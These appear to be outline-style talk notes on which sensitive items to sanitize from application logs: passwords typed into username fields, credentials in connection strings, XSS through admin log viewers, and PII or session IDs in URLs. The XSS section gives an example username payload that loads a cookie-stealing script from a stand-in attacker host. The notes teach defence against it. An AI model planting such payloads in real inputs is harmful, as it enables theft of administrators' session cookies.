# Ep-2: Log Sanitization


## Intro

-   Question that we'll investigate
    -   "What items should I sanitize from the application logs?"
        -   More than just passwords :)


## Recon Background

-   Physical Recon (Reconnaissance)
    -   Social Engineering: The Art of Human Hacking
        -   "I cant wait to jump in the dumpster!"
    -   Rushed employees don't shred documents
-   Application Logs
    -   Application's dumpster
        -   Common attack target
        -   Rushed Devs/DevOps engineers dont "shred" sensitive information


## Username Issues

-   User accidentally enters their password into the username field
-   Log view
    1.  "Username ronaldmcdonaldPassword123 doesn't exist"
    2.  "Username ronaldmcdonald logged in successfully"
-   Sanitize all usernames from logs?
    -   No
        -   Incident Response
        -   Find trade-off


## Username Issues (Solution)

-   Possible solution
-   Server-side validation
    -   If server receives a username with no password
        1.  Abort the request
            -   Dont query the DB
        2.  Dont log the username
        3.  Log IP for bot/DoS activity
-   Client-side validation as well
    -   Don't send the request


## Sanitize Logs For Credentials

-   User's password within a form `POST`
-   Connection strings with basic authentication
    -   DB connection strings
        -   `https://dbUser:dbPassword@www.example.com`
    -   Log View: "Connection to `https://dbUser:dbPassword@www.example.com` succeeded"
    -   Fix
        -   Setup logging middleware that sanitizes basic auth
            -   Regex `//:ANYTHING:ANYTHING@`
-   Build script output
    -   Jenkins
        -   <https://wiki.jenkins.io/display/JENKINS/Credentials+Plugin>
        -   Centralized secret management
        -   Dont use `set -x`


## Sanitize Logs For XSS

-   What is XSS (Cross Site Scripting)?
    -   Ex: Attacker places malicious javascript in victim's browser
        -   Steal auth cookie
-   How can the logs be an XSS risk?
    1.  Malicious guy signs up for a service with the username of
        -   `<script src="evil.com/authCookieStealer.js"></script>`
    2.  Log gets sent to admin UI
        -   Log View
            -   `Username <script src="evil.com/authCookieStealer.js"></script> logged in`
    3.  Admin views the logs
    4.  Admin's browser interprets HTML and loads `authCookieStealer.js`


## Sanitize Logs For XSS (Solution)

-   XSS filter before persisting to logs
    -   Escape All HTML special characters before logging
        -   Ex: `< >` etc.
-   `XSS` node.js module (and cli tool)
    -   Can escape all html tags or a tag whitelist
    -   `script` tag escaping
        -   <http://jsxss.com/en/try.html>
-   Recommendations
    -   For logs, nothing should be in whitelist
    -   For auditing, escape instead of removing tags


## Sanitize Logs For Sensitive Url Parameters

-   SSNs or other personally identifiable information
    -   Health conditions
        -   Check compliance
        -   Often logs are stored unencrypted, this could violate HIPAA
-   Auth Cookies
    -   Certain frameworks will automatically put sessionids (auth information) in url parameters if cookies are
        turned off
    -   Session Tracking
        -   Hash session
-   nginx considerations
    -   Talk to DevOps


## Additional Resources

-   <https://www.owasp.org/index.php/Logging_Cheat_Sheet>
-   <https://www.owasp.org/index.php/OWASP_Security_Logging_Project>


## Error Log

:PROPERTIES:


## Knowledge Dependency Tree
